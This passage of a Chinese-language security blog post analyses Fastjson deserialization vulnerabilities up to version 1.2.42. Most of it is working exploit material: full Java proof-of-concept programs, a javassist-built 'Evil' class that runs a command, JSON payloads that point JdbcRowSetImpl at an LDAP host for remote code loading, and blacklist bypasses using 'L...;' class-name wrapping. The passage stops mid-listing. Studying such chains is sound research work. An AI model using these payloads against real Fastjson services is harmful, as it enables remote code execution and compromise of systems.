<p> <strong>反序列化的时候调用的构造函数是无参构造函数</strong></p>
<h2 id="Fastjson-lt-x3D-1-2-24"><a href="#Fastjson-lt-x3D-1-2-24" class="headerlink" title="Fastjson&lt;&#x3D;1.2.24"></a>Fastjson&lt;&#x3D;1.2.24</h2><p>1.2.24版本是第一个被暴露出漏洞的版本</p>
<h3 id="JNDI利用链"><a href="#JNDI利用链" class="headerlink" title="JNDI利用链"></a>JNDI利用链</h3><p>根据fastjson的特性找到可利用的类，这里的利用类是<code>com.sun.rowset.JdbcRowSetImpl</code></p>
<p>在这个类中，利用点在connect方法里</p>
<pre><code class="java">private Connection connect() throws SQLException &#123;
        if (this.conn != null) &#123;
            return this.conn;
        &#125; else if (this.getDataSourceName() != null) &#123;
            try &#123;
                InitialContext var1 = new InitialContext();
                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
            &#125; catch (NamingException var3) &#123;
                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
            &#125;
        &#125; else &#123;
            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
        &#125;
    &#125;
</code></pre>
<p>这里可以看到new InitialContext()和lookup()方法，如果this.getDataSourceName()可控，这不就JDNI注入了吗</p>
<p>根进<code>this.getDataSourceName()</code>,这里是调用了父类的getDataSourceName方法</p>
<pre><code class="java">public String getDataSourceName() &#123;
        return dataSource;
    &#125;
</code></pre>
<p>下面是对应的setter方法</p>
<pre><code class="java">public void setDataSourceName(String name) throws SQLException &#123;

        if (name == null) &#123;
            dataSource = null;
        &#125; else if (name.equals(&quot;&quot;)) &#123;
           throw new SQLException(&quot;DataSource name cannot be empty string&quot;);
        &#125; else &#123;
           dataSource = name;
        &#125;

        URL = null;
    &#125;
</code></pre>
<p>所以只有构造如下，即可调用这个setter方法给<code>dataSource</code>赋值</p>
<pre><code class="java">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;&#125;
</code></pre>
<p>然后调用connect方法的时候就会调用getDataSourceName()获取到dataSource的内容</p>
<p>下一步就是如何调用<code>connect方法</code></p>
<p>通过查找，在这个类下找到两个，第一个是<code>getDatabaseMetaData</code></p>
<pre><code class="java">public DatabaseMetaData getDatabaseMetaData() throws SQLException &#123;
        Connection var1 = this.connect();
        return var1.getMetaData();
    &#125;
</code></pre>
<p>如果反序列化调用了这个getter方法，就会调用connect()，但是反序列化过程不会调用这个方法，因为这个方法的返回值是DatabaseMetaData,不满足返回值类型继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</p>
<p>如果要调用这个get方法，只能通过parseObject方法里面的<code>JSON.toJSON</code> ，但是要确保parse()不报错（这很难）</p>
<p>然后找下一个</p>
<pre><code class="java">public void setAutoCommit(boolean var1) throws SQLException &#123;
        if (this.conn != null) &#123;
            this.conn.setAutoCommit(var1);
        &#125; else &#123;
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        &#125;

    &#125;
</code></pre>
<p>因为反序列化的时候调用无参构造函数的时候，this.conn&#x3D;null,所以这里会进入else分支调用connect</p>
<p>综上所述，POC构造如下</p>
<pre><code class="java">String jsonstr3 = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;

JSON.parse(jsonstr3);//或者JSON.parseObject(jsonstr3)
</code></pre>
<p><strong>注意</strong>：</p>
<p>因为这个是存在一个调用顺序的，反序列化的过程中，先调用满足条件的setter方法，根据这个字符串从左往右依次执行，例如这个，先调用setDatabaseMetaData(),  然后再调用setAutoCommit,刚刚好先赋值再执行</p>
<p>所以将顺序调换是用不了的</p>
<pre><code class="java">&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;AutoCommit\&quot;:true,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;
</code></pre>
<p>如果是getter方法的话，就是先getAutoCommit()再getDatabaseMetaData()刚好反过来，顺序是从右往左</p>
<h3 id="TemplatesImpl-利用链"><a href="#TemplatesImpl-利用链" class="headerlink" title="TemplatesImpl 利用链"></a>TemplatesImpl 利用链</h3><p>javassist：</p>
<pre><code class="xml">&lt;dependency&gt;
      &lt;groupId&gt;org.javassist&lt;/groupId&gt;
      &lt;artifactId&gt;javassist&lt;/artifactId&gt;
      &lt;version&gt;3.22.0-GA&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>这里利用的是下面这个类：</p>
<pre><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
</code></pre>
<p>和CC2这条链的利用差不多,还是这个<code>defineTransletClasses</code>方法</p>
<pre><code class="java">private void defineTransletClasses()
        throws TransformerConfigurationException &#123;

        if (_bytecodes == null) &#123;
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        &#125;

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() &#123;
                public Object run() &#123;
                    return new TransletClassLoader(ObjectFactory.findClassLoader());
                &#125;
            &#125;);

        try &#123;
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount &gt; 1) &#123;
                _auxClasses = new Hashtable();
            &#125;

            for (int i = 0; i &lt; classCount; i++) &#123;
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;
                    _transletIndex = i;
                &#125;
                else &#123;
                    _auxClasses.put(_class[i].getName(), _class[i]);
                &#125;
            &#125;

            if (_transletIndex &lt; 0) &#123;
                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            &#125;
        &#125;
        catch (ClassFormatError e) &#123;
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        &#125;
        catch (LinkageError e) &#123;
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        &#125;
    &#125;
</code></pre>
<p>这个方法会创建一个长度为<code>_bytecodes.length</code>的数组<code>_class</code>，然后循环遍历每个转换类的字节码，并通过<code>loader.defineClass(_bytecodes[i])</code>方法将字节码转换为实际的<code>Class</code>对象，如果<code>_bytecodes</code>保存的是恶意的字节码，那这里就可以获得一个恶意的Class对象了</p>
<p>这个恶意类必须继承<code>AbstractTranslet</code>，因为：</p>
<pre><code class="java">//private static String ABSTRACT_TRANSLET
        = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;
                    _transletIndex = i;
                &#125;
</code></pre>
<p>如何获取恶意的字节码？</p>
<p>使用javassist来构造</p>
<pre><code class="java">ClassPool pool = ClassPool.getDefault();
CtClass Evil = pool.makeClass(&quot;Evil&quot;);
Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));
String name = &quot;Evil&quot;;
Evil.setName(name);
String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
CtConstructor constructor = Evil.makeClassInitializer();
constructor.insertBefore(cmd);
byte[] bytes =Evil.toBytecode();
</code></pre>
<p>下一步考虑_bytecodes如何赋值</p>
<pre><code class="java">private synchronized void setTransletBytecodes(byte[][] bytecodes) &#123;
        _bytecodes = bytecodes;
    &#125;
</code></pre>
<p>这个setter方法可以给<code>_bytecodes</code>赋值的但是它是<code>private</code>修饰的,反序列化时不会调用,找遍了setter和getter方法也没有找到一个可以让<code>_bytecodes</code>赋值的地方</p>
<p><strong>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</strong></p>
<pre><code class="java">JSON.parse(payload, Feature.SupportNonPublicField);
或
JSON.parseObject(payload, Feature.SupportNonPublicField);
</code></pre>
<p>所以构造payload如下：</p>
<pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;_bytecodes\&quot;]&#125;&quot;
</code></pre>
<p>下一步就是要想如何调用defineTransletClasses()</p>
<p>按照CC2的利用链是找到了getTransletInstance()这个方法</p>
<pre><code class="java">private Translet getTransletInstance()
        throws TransformerConfigurationException &#123;
        try &#123;
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) &#123;
                translet.setAuxiliaryClasses(_auxClasses);
            &#125;

            return translet;
        &#125;
        catch (InstantiationException e) &#123;
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        &#125;
        catch (IllegalAccessException e) &#123;
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        &#125;
    &#125;
</code></pre>
<p>这个方法刚好可以运行<code>defineTransletClasses</code>后调用了newInstance()对_class进行了实例化，只要控制<code>_name</code>不为null即可</p>
<p>但是这个getter方法不能直接调用，又是private修饰</p>
<p>继续往上寻找能够调用getTransletInstance的方法</p>
<p>找到这个newTransformer()</p>
<pre><code class="java">public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    &#123;
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) &#123;
            transformer.setURIResolver(_uriResolver);
        &#125;

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;
            transformer.setSecureProcessing(true);
        &#125;
        return transformer;
    &#125;
</code></pre>
<p>这个方法不上setter或者getter, 继续寻找调用<code>newTransformer</code>方法的地方</p>
<pre><code class="java">public synchronized Properties getOutputProperties() &#123;
        try &#123;
            return newTransformer().getOutputProperties();
        &#125;
        catch (TransformerConfigurationException e) &#123;
            return null;
        &#125;
    &#125;
</code></pre>
<p>这个getter满足自动调用的条件，可以用,  刚好存在<code>_outputProperties</code>属性。Properties类型继承自 <code>Hashtable</code>，所以给个空键值对<code>&#123;&#125;</code> 即可</p>
<p>payload如下：</p>
<pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;_bytecodes\&quot;],\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;
</code></pre>
<p>在结合一下上面提到的条件<code>_name</code>不为null</p>
<pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;_bytecodes\&quot;],\&quot;_name\&quot;:\&quot;AA\&quot;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;
</code></pre>
<p>然后运行发现，正常流程都走完了，就是没有运行恶意代码</p>
<p>调试发现在com.alibaba.fastjson.parser.JSONScanner#bytesValue中，如果Field类型为byte[]，会进行base64解码</p>
<pre><code class="java">public byte[] bytesValue() &#123;
        return IOUtils.decodeBase64(text, np + 1, sp);
    &#125;
</code></pre>
<p>所以将生成的_bytecodes进行base64编码即可</p>
<p>最终POC</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import java.io.*;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import com.alibaba.fastjson.parser.JSONScanner;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
public class App 
&#123;
    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException &#123;
        //构造恶意类
        ClassPool pool = ClassPool.getDefault();
        CtClass Evil = pool.makeClass(&quot;Evil&quot;);
        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));
        String name = &quot;Evil&quot;;
        Evil.setName(name);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        CtConstructor constructor = Evil.makeClassInitializer();
        constructor.insertBefore(cmd);
        byte[] bytes =Evil.toBytecode();

        byte[] encodedBytes = Base64.getEncoder().encode(bytes);
        String base64Code=new String(encodedBytes, StandardCharsets.UTF_8);

        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+base64Code+&quot;\&quot;],\&quot;_name\&quot;:\&quot;aa\&quot;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;
        JSON.parse(payload, Feature.SupportNonPublicField);
//        JSON.parseObject(payload, Feature.SupportNonPublicField);


    &#125;
&#125;
</code></pre>
<p>因为上面测试的jdk版本为8u41,和高版本的payload不一样</p>
<p>思想是一样的，只是多控制了个参数</p>
<p>在高版本的defineTransletClasses中，loader变了 ，这里还需要控制<code>_tfactory</code>不为空</p>
<pre><code class="java">TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() &#123;
                public Object run() &#123;
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                &#125;
            &#125;);
</code></pre>
<p>所以构造POC:</p>
<pre><code class="json">&#123;
        &quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
        &quot;_bytecodes&quot;:[&quot;base64Code&quot;],
        &quot;_name&quot;:&quot;aa&quot;,
        &quot;_tfactory&quot;:&#123; &#125;,
        &quot;_outputProperties&quot;:&#123;&#125;,
        &quot;_version&quot;:&quot;&quot;
    &#125;
</code></pre>
<h2 id="Fastjson1-2-25-1-2-41"><a href="#Fastjson1-2-25-1-2-41" class="headerlink" title="Fastjson1.2.25-1.2.41"></a>Fastjson1.2.25-1.2.41</h2><p>条件：开启AutoType</p>
<p>环境搭建：</p>
<pre><code class="xml">&lt;dependency&gt;
      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
      &lt;version&gt;1.2.25&lt;/version&gt;
    &lt;/dependency&gt;
</code></pre>
<p>在这个版本中对前面的版本漏洞进行了修复</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230807151344823.png" alt="image-20230807151344823"></p>
<p>在此版本中，新增了黑名单和白名单功能<br>在<code>ParserConfig</code>中，可以看到黑名单的内容，而且设置了一个<code>autoTypeSupport</code>用来控制是否可以反序列化，<code>autoTypeSupport</code>默认为<code>false</code>且禁止反序列化，为true时会使用<code>checkAutoType</code>来进行安全检测</p>
<pre><code class="java">private boolean   autoTypeSupport = AUTO_SUPPORT;

private String[]  denyList = &quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;.split(&quot;,&quot;);
private String[]   acceptList  = AUTO_TYPE_ACCEPT_LIST;//[]
</code></pre>
<p>可以看上面版本利用的<code>com.sun.</code>在黑名单里面</p>
<p>在<code>checkAutoType</code>中进行了黑白名单检查,但是调试发现白名单为空</p>
<pre><code class="java">if (autoTypeSupport || expectClass != null) &#123;
            for (int i = 0; i &lt; acceptList.length; ++i) &#123;
                String accept = acceptList[i];
                if (className.startsWith(accept)) &#123;
                    return TypeUtils.loadClass(typeName, defaultClassLoader);
                &#125;
            &#125;

            for (int i = 0; i &lt; denyList.length; ++i) &#123;
                String deny = denyList[i];
                if (className.startsWith(deny)) &#123;
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                &#125;
            &#125;
        &#125;
</code></pre>
<p>首先autoTypeSupport默认为false,如果要修改为true,可以通过服务的添加<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p>
<p>进入上面的判断后，先进行白名单检查，如果找到，则直接返回class，如果没找到，往下进行黑名单检查</p>
<p>还有</p>
<p>当autoTypeSupport为false的时候会进入下面的逻辑</p>
<pre><code class="java">if (!autoTypeSupport) &#123;
            for (int i = 0; i &lt; denyList.length; ++i) &#123;
                String deny = denyList[i];
                if (className.startsWith(deny)) &#123;
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                &#125;
            &#125;
            for (int i = 0; i &lt; acceptList.length; ++i) &#123;
                String accept = acceptList[i];
                if (className.startsWith(accept)) &#123;
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;
                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
                    &#125;
                    return clazz;
                &#125;
            &#125;
        &#125;
</code></pre>
<p>这里和上面的差不多，但是是先进行黑名单检查，再进行白名单检查</p>
<p>如果黑白名单里面都没找到，那只能</p>
<pre><code class="java">if (autoTypeSupport || expectClass != null) &#123;
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
        &#125;
</code></pre>
<p>如果这个if也进不去，返回clazz&#x3D;null</p>
<h3 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>无论autoTypeSupport是否为true,都需要经过检查黑白名单，看似只能找到其他的利用类绕过黑名单</p>
<p>先看看loadClass的逻辑</p>
<pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;
        if (className == null || className.length() == 0) &#123;
            return null;
        &#125;

        Class&lt;?&gt; clazz = mappings.get(className);

        if (clazz != null) &#123;
            return clazz;
        &#125;

        if (className.charAt(0) == &#39;[&#39;) &#123;//[开头
            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
            return Array.newInstance(componentType, 0).getClass();
        &#125;

        if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;//L开头，;结尾
            String newClassName = className.substring(1, className.length() - 1);//去除开头和结尾
            return loadClass(newClassName, classLoader);
        &#125;

    .......
    
    &#125;
</code></pre>
<p>很明显的看到这里会对className进行处理，如果className的开头为<code>[</code>，会去掉这个开头再加载</p>
<p>但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。</p>
<p>如果是L开头，<code>;</code>结尾的，会去除<code>L</code>和<code>;</code> 进行加载，直接返回加载结果</p>
<p>1.2.24版本的链子是这样的</p>
<pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;
</code></pre>
<p>如果将其修改为</p>
<pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;
</code></pre>
<p>就可以绕过黑名单中对<code>com.sun</code>的检测了</p>
<p>但是绕过黑白名单后，还是没法进行loadclass,只剩下</p>
<pre><code class="java">if (autoTypeSupport || expectClass != null) &#123;
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
        &#125;
</code></pre>
<p>为了能够进入这个if语句，只能在服务段进行修改,添加下面语句：</p>
<pre><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
</code></pre>
<p>完整POC</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
public class App
&#123;
    public static void main( String[] args ) &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;
        JSON.parseObject(payload);

    &#125;
&#125;
</code></pre>
<p>同理，TemplatesImpl 利用链也可以利用</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import java.io.*;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import javassist.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
public class App
&#123;
    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException &#123;
        //构造恶意类
        ClassPool pool = ClassPool.getDefault();
        CtClass Evil = pool.makeClass(&quot;Evil&quot;);
        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));
        String name = &quot;Evil&quot;;
        Evil.setName(name);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        CtConstructor constructor = Evil.makeClassInitializer();
        constructor.insertBefore(cmd);
        byte[] bytes =Evil.toBytecode();

        byte[] encodedBytes = Base64.getEncoder().encode(bytes);
        String base64Code=new String(encodedBytes, StandardCharsets.UTF_8);


        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+base64Code+&quot;\&quot;],\&quot;_name\&quot;:\&quot;A\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;
        JSON.parse(payload, Feature.SupportNonPublicField);
//        JSON.parseObject(payload, Feature.SupportNonPublicField);

    &#125;
&#125;
</code></pre>
<h2 id="Fastjson1-2-25-1-2-42"><a href="#Fastjson1-2-25-1-2-42" class="headerlink" title="Fastjson1.2.25-1.2.42"></a>Fastjson1.2.25-1.2.42</h2><p>条件：开启AutoType</p>
<p>环境搭建</p>
<pre><code class="java">&lt;dependency&gt;
      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
      &lt;version&gt;1.2.42&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>这个版本中对src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;ParserConfig.java进行了大量修改，其中最明显的是将黑名单变成了hashcode</p>
<pre><code class="java">denyHashCodes = new long[]&#123;
                -8720046426850100497L,
                -8109300701639721088L,
                -7966123100503199569L,
                -7766605818834748097L,
                -6835437086156813536L,
                -4082057040235125754L,
                -3979025623072794412L,
                -2364987994247679115L,
                -1872417015366588117L,
                -254670111376247151L,
                33238344207745342L,
                313864100207897507L,
                1203232727967308606L,
                3547627781654598988L,
                3730752432285826863L,
                4147696707147271408L,
                5450448828334921485L,
                5751393439502795295L,
                5944107969236155580L,
                6742705432718011780L,
                7179336928365889465L,
                7442624256860549330L,
                8838294710098435315L
        &#125;;
</code></pre>
<p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<h3 id="绕过分析-1"><a href="#绕过分析-1" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>重新审计checkAutoType()方法</p>
<pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
        if (typeName == null) &#123;
            return null;
        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;
            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
            Class&lt;?&gt; clazz = null;
            long BASIC = -3750763034362895579L;
            long PRIME = 1099511628211L;
            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;
                className = className.substring(1, className.length() - 1);
            &#125;
</code></pre>
<p>首先获取@type指定的类的名字，如果存在<code>$</code>，就将其改为<code>.</code></p>
<p>然后对className的开头结尾进行与hash异或检测，如果满足if的条件就进行“去头去尾”  ，经过测试发现这里就是将<code>L</code>开头的和<code>;</code>结尾的className进行处理</p>
<p>然后往下</p>
<pre><code class="java">            long h3 = (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L ^ (long)className.charAt(2)) * 1099511628211L;
            long hash;
            int i;
            if (this.autoTypeSupport || expectClass != null) &#123;
                hash = h3;

                for(i = 3; i &lt; className.length(); ++i) &#123;
                    hash ^= (long)className.charAt(i);
                    hash *= 1099511628211L;
                    if (Arrays.binarySearch(this.acceptHashCodes, hash) &gt;= 0) &#123;
                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
                        if (clazz != null) &#123;
                            return clazz;
                        &#125;
                    &#125;

                    if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123;
                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                    &#125;
                &#125;
            &#125;
</code></pre>
<p>这里其实就是进行黑白名单检测，只是变成了hash的样子(估计是为了加大审计难度)，进入这个if也是需要autoTypeSupport&#x3D;&#x3D;true</p>
<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
</code></pre>
<p>想绕过这里很简单，只需要再套一层<code>L</code>开头的和<code>;</code>结尾即可，</p>
<pre><code class="java">LLcom.sun.rowset.JdbcRowSetImpl;;
</code></pre>
<p>黑白名单检测前会去除掉一层，</p>
<pre><code>Lcom.sun.rowset.JdbcRowSetImpl;
</code></pre>
<p>这个就可以绕过黑白名单了</p>
<p>然后往下继续</p>
<pre><code class="java">if (clazz == null) &#123;
    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
&#125;
</code></pre>
<p>因为clazz &#x3D;&#x3D; null,进入<code>loadClass</code>,此时<code>typeName</code>为</p>
<pre><code>LLcom.sun.rowset.JdbcRowSetImpl;;
</code></pre>
<p>进入loadClass后</p>
<pre><code class="java">if (className != null &amp;&amp; className.length() != 0) &#123;
    Class&lt;?&gt; clazz = (Class)mappings.get(className);
    if (clazz != null) &#123;
        return clazz;
    &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;
        Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
        return Array.newInstance(componentType, 0).getClass();
    &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;
        String newClassName = className.substring(1, className.length() - 1);
        return loadClass(newClassName, classLoader);
</code></pre>
<p>还是和上一个版本的一样，遇到<code>L</code>开头<code>;</code>结尾的就进行去头去尾得到新的newClassName</p>
<pre><code>Lcom.sun.rowset.JdbcRowSetImpl;
</code></pre>
<p>然后将这个newClassName再传到<code>loadClass(newClassName, classLoader)</code></p>
<p>也就是这个方法本身，这里类似递归</p>
<p>还是相同的逻辑进行去头去尾，然后获得到新的newClassName</p>
<pre><code class="Lcom.sun.rowset.JdbcRowSetImpl">com.sun.rowset.JdbcRowSetImpl
</code></pre>
<p>然后再走到这个loadClass，这次不会进入这些else if分支了</p>
<p>直接走的是最后的else分支</p>
<pre><code class="java">try &#123;
         ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
         if (contextClassLoader != null &amp;&amp; contextClassLoader != classLoader) &#123;
             clazz = contextClassLoader.loadClass(className);
              if (cache) &#123;
                mappings.put(className, clazz);
                &#125;

              return clazz;
            &#125;
         &#125; catch (Throwable var6) &#123;
     &#125;
</code></pre>
<p>首先是获取加载器contextClassLoader，加载器满足if的条件的条件进入if语句，然后加载<code>com.sun.rowset.JdbcRowSetImpl</code>并返回</p>
<p>整个恶意类加载的过程大概就是酱紫了，完整的POC:</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
public class App
&#123;
    public static void main( String[] args ) &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
        String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;
        JSON.parseObject(payload);

